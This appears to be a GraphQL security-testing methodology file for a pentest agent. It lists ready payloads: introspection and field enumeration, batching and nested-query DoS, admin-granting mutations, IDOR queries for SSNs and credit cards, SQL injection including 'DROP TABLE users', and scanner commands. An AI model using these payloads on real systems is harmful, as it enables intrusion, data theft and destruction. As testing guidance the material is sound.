---
name: graphql
description: GraphQL-specific security testing methodology
applicable_contexts: [api, web]
---

## GraphQL Security Testing

### Introspection Query

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name } }
        args { name type { name } }
      }
    }
    mutationType { fields { name } }
    queryType { fields { name } }
  }
}
```

If introspection is disabled, use field suggestion enumeration:
```graphql
{ user { __typename } }
# Error message may reveal field names: "Did you mean 'users'?"
```

### Batch Query Attacks (DoS)

```graphql
# Query batching — multiple operations in one request
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"}
]
```

### Nested Query DoS (Query Depth Attack)

```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends { name }
          }
        }
      }
    }
  }
}
```

### Authorization Bypass via Mutations

```graphql
# Direct object access
mutation { updateUser(id: "OTHER_USER_ID", role: "admin") { id role } }

# Mass assignment through mutations
mutation { createUser(input: { name: "test", isAdmin: true }) { id } }
```

### IDOR Through GraphQL

```graphql
# Enumerate users
{ user(id: "1") { email ssn creditCard } }
{ user(id: "2") { email ssn creditCard } }

# Access other user's data
{ order(id: "OTHER_ORDER_ID") { items total shippingAddress } }
```

### SQL Injection in Arguments

```graphql
{ user(name: "admin' OR '1'='1") { id email } }
{ search(query: "'; DROP TABLE users; --") { results } }
```

### Tools

```bash
# InQL — GraphQL security scanner
inql -t https://target.com/graphql

# graphql-cop — compliance testing
graphql-cop -t https://target.com/graphql

# clairvoyance — field enumeration without introspection
clairvoyance -o /workspace/schema.json https://target.com/graphql
```

### Validation Requirements

- Document full schema if introspection is enabled
- Show unauthorized data access via query/mutation
- Demonstrate DoS potential with query depth/batching metrics
- Test all mutations for authorization checks

### Business Impact

- Full schema exposure reveals internal data model
- IDOR at scale through query enumeration
- Denial of service via expensive nested queries
- Data exfiltration through unauthorized field access
